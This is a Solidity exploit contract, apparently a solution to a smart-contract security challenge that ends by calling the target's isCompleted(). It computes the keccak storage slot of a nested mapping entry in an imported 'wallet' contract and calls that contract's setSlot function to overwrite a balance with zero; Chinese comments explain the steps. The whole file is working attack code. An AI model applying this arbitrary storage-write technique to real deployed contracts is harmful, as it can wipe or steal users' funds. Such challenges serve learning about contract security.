//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./wallet.sol";

contract walletAttack{
    ERC20 public token;
    check public wal;
    constructor(address _wal){
        token = new ERC20();
        wal = check(_wal);
    }
    //增加自己钱包
    function add(string memory name,uint256 amount)public{
        token.approve(address(wal),amount);
        wal.addWallet(name,address(token),amount);
    }

    function fig1(address _addr,uint256 slot) public pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(_addr))),bytes32(slot)));
    }
    function fig2(bytes32 slot)public pure returns(bytes32){
        return keccak256(abi.encodePacked(slot));
    }
    function fig3(address _addr,bytes32 slot)public pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(_addr))),bytes32(slot)));
    }
    //调用这个函数通过计算出的存储位即可将余额设为0
    function setBalance()public{
        bytes32 slot = fig3(address(wal.fake()),bytes32(uint256(fig2(fig1(address(wal),0)))+2));
        wal.setSlot(slot,bytes32(0));
    }

    function complete()public{
        wal.isCompleted();
    }
}